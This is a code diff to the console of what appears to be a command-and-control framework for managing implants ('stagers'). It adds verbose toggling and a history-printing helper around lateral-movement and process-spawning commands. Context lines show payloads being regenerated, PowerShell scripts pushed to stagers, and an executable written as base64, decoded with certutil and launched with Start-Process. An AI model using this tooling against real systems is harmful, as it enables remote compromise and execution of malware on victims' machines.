@@ -250,8 +250,7 @@ class mymainclass():
                     if user_input_stager not in self.__t_myserver.get_stager():
                         print("Please input a valid stager uuid")
                         continue
-                    for each_msg in self.__t_myserver.get_history()[user_input_stager]:
-                        print(each_msg)
+                    self.__t_myserver.print_history(user_input_stager,False)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_GET_INTO:
@@ -672,8 +671,7 @@ class mymainclass():
                     if user_input_stager not in self.__t_myserver.get_stager():
                         print("Please input a valid stager uuid")
                         continue
-                    for each_msg in self.__t_myserver.get_history()[user_input_stager]:
-                        print(each_msg)
+                    self.__t_myserver.print_history(user_input_stager,False)
                     continue
                 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_GETDOMAIN:
@@ -767,6 +765,9 @@ class mymainclass():
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSJUMP:
+                    #disable verbose
+                    self.__t_myserver.set_verbose(False)
+
                     #re-generate payload 
                     t_mypayloadgen = payloadgen.mypayloadgen()
                     if self.__t_mypayload.payloadtype == "socket":
@@ -798,9 +799,15 @@ class mymainclass():
                     self.__t_myserver.create_command(user_input_stager,"psload",t_result)
                     self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-myclient.ps1")
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.PSJOB.format("Invoke-myclient"))
+                    
+                    #enable verbose
+                    self.__t_myserver.set_verbose(True)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_SPAWN_PS:
+                    #disable verbose
+                    self.__t_myserver.set_verbose(False)
+
                     #re-generate payload 
                     t_mypayloadgen = payloadgen.mypayloadgen()
                     if self.__t_mypayload.payloadtype == "socket":
@@ -826,6 +833,9 @@ class mymainclass():
                         print("Payload already loaded")
                     
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.PSJOB.format("Invoke-myclient"))
+                    
+                    #enable verbose
+                    self.__t_myserver.set_verbose(True)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_WHOAMI:
@@ -853,6 +863,9 @@ class mymainclass():
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSJUMP_EXE:
+                    #disable verbose
+                    self.__t_myserver.set_verbose(False)
+
                     #re-generate payload 
                     t_mypayloadgen = payloadgen.mypayloadgen()
                     if self.__t_mypayload.payloadtype == "socket":
@@ -886,6 +899,9 @@ class mymainclass():
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.B64_SAVE.format(tosend,user_input_path,t_name))
                     self.__t_myserver.create_command(user_input_stager,"ps","certutil -decode {} {}".format(os.path.join(user_input_path,"{}.txt".format(t_name)),os.path.join(user_input_path,"{}.exe".format(t_name))))
                     self.__t_myserver.create_command(user_input_stager,"ps","Start-Process {}".format(os.path.join(user_input_path,"{}.exe".format(t_name))))
+                    
+                    #enable verbose
+                    self.__t_myserver.set_verbose(True)
                     continue
 
 
